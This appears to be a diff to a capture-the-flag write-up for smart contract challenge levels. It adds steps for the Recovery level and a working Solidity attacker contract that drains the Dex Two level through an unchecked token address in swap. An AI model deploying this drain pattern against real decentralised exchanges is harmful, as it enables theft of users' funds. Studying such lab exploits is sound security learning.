@@ -278,8 +278,11 @@ contract.setFirstTime("0x32E1e47BC0D8Dd96aaf1EdA95ffE3eC55c0892E9")
 
 
 ## Recovery
-TODO
+This one is pretty simple. Go to the blockchain explorer (like Etherscan) and go to the Recovery contract. In the internal functions, you should see a contract creation (which is the Token contract). Take the address, and call the destroy function with your address as parameter.
 
+```
+EXPLOIT WILL BE DONE ONCE Goerli IS CHEAPER !!!
+```
 
 ## Magic Number
 
@@ -335,6 +338,41 @@ contract attackShop {
 ```
 
 
+## Dex
+TODO
+
+
+## Dex Two
+Looking at the swap function, we can see that the function does not verify that `from` is token1 or token2. So, we can create our own ERC20 Token to manipulate the Dex.
+
+```
+contract Dex2Attacker is ERC20 {
+  ERC20 victim1;
+  ERC20 victim2;
+  DexTwo dexVictim;
+
+
+  constructor(address dex, address token1, address token2) ERC20("Attacker", "ATK") {
+    dexVictim = DexTwo(dex);
+    victim1 = ERC20(token1);
+    victim2 = ERC20(token2);
+  }
+
+  function attack() external {
+    _mint(address(dexVictim), 100 ether);
+    _mint(address(this), 1000 ether);
+    _approve(address(this), address(dexVictim), 1000 ether);
+    dexVictim.swap(address(this), address(victim1), 100 ether);
+    victim1.transfer(msg.sender, 100 ether);
+
+    // Burn 100 tokens of dexVictim
+    _burn(address(dexVictim), 100 ether);
+    dexVictim.swap(address(this), address(victim2), 100 ether);
+    victim2.transfer(msg.sender, 100 ether);
+
+  }
+}
+```
 
 
 ## Others
